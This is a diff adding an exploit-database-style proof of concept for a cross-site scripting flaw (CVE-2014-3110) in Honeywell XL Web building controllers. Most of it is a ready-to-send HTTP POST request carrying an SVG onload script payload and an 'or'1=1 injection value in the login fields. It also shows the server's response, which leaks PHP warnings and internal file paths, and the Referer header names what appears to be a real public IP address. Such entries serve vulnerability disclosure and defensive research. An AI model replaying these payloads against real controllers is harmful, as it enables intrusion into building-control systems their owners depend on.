@@ -1,0 +1,57 @@
+# Exploit Title: Honeywell XL Web Controller - Cross-Site Scripting
+# Date: 2018-05-24
+# Exploit Author: t4rkd3vilz
+# Vendor Homepage: https://www.honeywell.com
+# Version: WebVersion : XL1000C50 EXCEL WEB 52 I/O, XL1000C100 EXCEL WEB
+# 104 I/O, XL1000C500 EXCEL WEB 300 I/O, XL1000C1000 EXCEL WEB 600 I/O,
+# XL1000C50U EXCEL WEB 52 I/O UUKL, XL1000C100U EXCEL WEB 104 I/O UUKL,
+# XL1000C500U EXCEL WEB 300 I/O UUKL, and XL1000C1000U EXCEL WEB 600 I/O UUKL.
+# Tested on: Linux
+# CVE: CVE-2014-3110
+
+# PoC
+
+POST /standard/mainframe.php HTTP/1.1
+Cache-Control: no-cache
+Referer: http://79.2.122.25/standard/mainframe.php
+Accept: text/xml,application/xml,application/xhtml+xml,text/
+html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/41.0.2272.16 Safari/537.36
+Accept-Language: en-us,en;q=0.5
+Cookie: Locale=1033
+Accept-Encoding: gzip, deflate
+Content-Length: 222
+Content-Type: application/x-www-form-urlencoded
+
+SessionID=&LocaleID='or'1=1&LoginSessionID=&LoginUserNameMD5="/><svg/
+onload=prompt(/XSS/)>
+&LoginPasswordMD5=&LoginCommand=&LoginPassword=&
+rememberMeCheck=&LoginDevice=192.168.1.12&LoginUserName=Guest
+
+HTTP/1.1 200 OK
+Set-Cookie: rememberUser=deleted; expires=Wednesday, 24-May-17 08:54:02
+GMT; path=/
+Server: Apache/1.3.23 (Unix) PHP/4.4.9
+X-Powered-By: PHP/4.4.9
+Content-Type: text/html
+Transfer-Encoding: chunked
+Date: Thu, 24 May 2018 08:54:03 GMT
+
+<br />
+<b>Warning</b>:  xw_get_users() expects parameter 1 to be long, string
+given in <b>/mnt/mtd6/xlweb/web/standard/login/loginpage.php</b> on line
+<b>97</b><br />
+<br />
+<b>Warning</b>:  xml_load_texts_file() expects parameter 2 to be long,
+string given in <b>/mnt/mtd6/xlweb/web/standard/include/elements.php</b> on
+line <b>247</b><br />
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+    <meta http-equiv="expires" content="0"/>
+    <link rel="stylesheet" href="include/honeywell.css"/>
+    <title><br />
+<b>Notice</b>:  Undefined index:  HeadTitle in <b>/mnt/mtd6/xlweb/web/
+standard/login/loginpage.php</b> on line <b>300</b><br />
+</title>
